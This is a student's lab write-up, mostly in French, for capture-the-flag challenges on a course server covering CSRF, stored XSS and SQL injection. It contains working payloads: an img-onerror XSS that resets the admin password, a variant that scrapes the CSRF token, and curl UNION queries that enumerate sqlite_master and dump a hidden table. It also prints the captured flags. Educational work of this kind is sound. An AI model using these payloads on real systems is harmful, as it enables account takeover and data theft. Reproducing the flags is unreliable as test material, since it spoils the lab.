# Lab 1 - Nathan Rayburn

## CSRF Simple

### 1. Quelle fonctionnalité du site, potentiellement vulnérable à une faille CSRF, pourriez-vous exploiter pour voler le compte administrateur ?

The password change functionality is vulnerable to CSRF and can be exploited to steal the admin account.

```javascript
fetch("http://basic.csrf.slh.cyfr.ch/profile/nathan.rayburn", {
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    "body": "password=test",
    "method": "POST",
});
```

### 2. Proposez une requête qui vous permettra de prendre le contrôle du compte admin, si elle était exécutée par l’administrateur

Un injection pourrait se faire à travers le compte d'administrateur lorsqu'il reçoit un message à travers l'application web. 

```javascript
fetch("http://basic.csrf.slh.cyfr.ch/profile/nathan.rayburn_admin", {
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    "body": "password=hackerspassword",
    "method": "POST",
});
```

### 3. Écrivez une payload JavaScript qui exécute la requête

```html
<img src='invalid.jpg' onerror="
  fetch('/profile/nathan.rayburn_admin', {
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'password=test',
    method: 'POST'
  })
">
```

### 4. Quelle fonctionnalité du site, potentiellement vulnérable à une faille Stored XSS, pourriez-vous exploiter pour faire exécuter votre payload ?

La fonctionnalité de validation des entrées utilisateur (input validation) est vulnérable à une attaque Stored XSS.

### 5. Quel est le flag ? Comment avez-vous pu l'obtenir ?

On a pu récupérer le flag en utilisant l'injection via une balise HTML qui nous permet d'exécuter du `javascript` lorsque l'image charge. Comme l'image n'existe pas, le `onerror` s'exécute, là notre payload malveillant fait effet et on change le mot de passe de l'administateur à ce que l'on souhaite.


```html
<img src='invalid.jpg' onerror="
  fetch('/profile/nathan.rayburn_admin', {
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'password=test',
    method: 'POST'
  })
">
```

```bash
Congratulation! Your flag is: 8YeeieGoK/aDoTwo
```

### 6. Comment corrigeriez-vous la vulnérabilité ?

Pour corriger la vulnérabilité, il est nécessaire de mettre en place un mécanisme de protection contre les attaques CSRF (comme l'utilisation de jetons CSRF) et de valider correctement les entrées pour éviter les injections de code.

---

## CSRF Avancée

### 1. Qu’est-ce qu’un jeton anti-CSRF, comment fonctionne-t-il ?

Un jeton anti-CSRF est une valeur unique et aléatoire qui est envoyée avec chaque requête. Il est vérifié côté serveur pour s'assurer que la requête provient d'une session utilisateur authentifiée et non d'une attaque CSRF.

### 2. Comment déterminer si le formulaire est protégé par un jeton anti-CSRF ?

Un formulaire est protégé par un jeton CSRF si un champ caché contenant le jeton est présent dans le formulaire, et ce jeton est vérifié par le serveur lorsqu'une requête est soumise.

### 3. Le site est également vulnérable à une attaque XSS. Quel est le flag du challenge ? Décrivez l’attaque.

L'attaque XSS est déclenchée en injectant du code JavaScript malveillant, qui exécute une requête pour récupérer un jeton CSRF puis modifie les données sensibles.

```html
<img src='invalid.jpg' onerror="
  fetch('/profile/nathan.rayburn_admin', { method: 'GET' })
    .then(response => response.text())
    .then(html => {
      const parser = new DOMParser();
      const doc = parser.parseFromString(html, 'text/html');
      const csrfToken = doc.querySelector('#_csrf').value;
      
      return fetch('/profile/nathan.rayburn_admin', {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `_csrf=${csrfToken}&password=test`,
        method: 'POST'
      });
    })
">
```

```bash
Congratulation! Your flag is: wMQf78jUXavuMdp1
```

### 4. Comment corrigeriez-vous la vulnérabilité ?

Pour corriger cette vulnérabilité, il est recommandé de valider et d'échapper toutes les entrées utilisateur avant de les afficher, afin de prévenir les attaques XSS.

---

## Injection SQL

### 1. Quelle partie du service est vulnérable à une injection SQL ?

La fonctionnalité qui permet de récupérer des données en fonction de l'ID dans la base de données est vulnérable à une injection SQL.

```bash
curl 'http://sql.slh.cyfr.ch/flowers' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9,de-DE;q=0.8,de;q=0.7,fr;q=0.6' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/json' \
  -H 'DNT: 1' \
  -H 'Origin: http://sql.slh.cyfr.ch' \
  -H 'Referer: http://sql.slh.cyfr.ch/' \
  -H 'User-Agent: Mozilla/5.0' \
  --data-raw '{"id":"4"}' \
  --insecure
```

### 2. Le serveur implémente une forme insuffisante de validation des entrées. Expliquez pourquoi c’est insuffisant.

Le serveur ne valide pas correctement les entrées, permettant ainsi d'injecter des requêtes SQL malveillantes. Cela peut entraîner une fuite de données ou une modification non autorisée des données.

### 3. Quel est le flag ? Comment avez-vous procédé pour l’obtenir ?

Le flag a été obtenu en exploitant une injection SQL pour extraire des données sensibles depuis une table cachée dans la base de données.

J'ai pu trouver qu'on peut injecter du SQL en utilisant des commentaires pour séparer les commandes. On connait la table `flowers` et on aimerait trouver un `UNION` avec une autre table existante qui >= de colonnes.


En recherchant, on a trouvé que c'était du `SQLite` et donc on a regardé les tables par défaut dans la documentation.


```bash
curl 'http://sql.slh.cyfr.ch/flowers' \
  -H 'Accept: */*' \
  -H 'Content-Type: application/json' \
  --data-raw '{"id":"1/**/UNION/**/SELECT/**/type,/**/name,/**/tbl_name,/**/sql/**/FROM/**/sqlite_master/**/"}' \
  --insecure
```

Output
```bash
[[1,"Rose","Red",5],["index","sqlite_autoindex_super_secret_stuff_1","super_secret_stuff",null],["table","flowers","flowers","CREATE TABLE flowers (\n            id INTEGER PRIMARY KEY,\n            name TEXT,\n            color TEXT,\n            petals INTEGER\n        )"],["table","super_secret_stuff","super_secret_stuff","CREATE TABLE super_secret_stuff (name TEXT PRIMARY KEY, value TEXT)"]]
```

On trouve une table `super_secret_stuff`

```bash
curl 'http://sql.slh.cyfr.ch/flowers' \
  -H 'Accept: */*' \
  -H 'Content-Type: application/json' \
  --data-raw '{"id":"1/**/UNION/**/SELECT/**/name,/**/value,/**/NULL,/**/NULL/**/FROM/**/super_secret_stuff"}' \
  --insecure
```

```bash
[[1,"Rose","Red",5],["flag","SLH25{D0N7_P4r53_5Q1_M4NU411Y}",null,null]]
```

### 4. Quel est le DBMS utilisé ? Auriez-vous procédé différemment si le DBMS avait été MySQL ou MariaDB ?

Le DBMS utilisé est SQLite, ce qui est révélé par les métadonnées dans la table `sqlite_master`. Si le DBMS avait été MySQL ou MariaDB, l'approche aurait pu être similaire, mais les différences syntaxiques des injections SQL auraient dû être prises en compte.
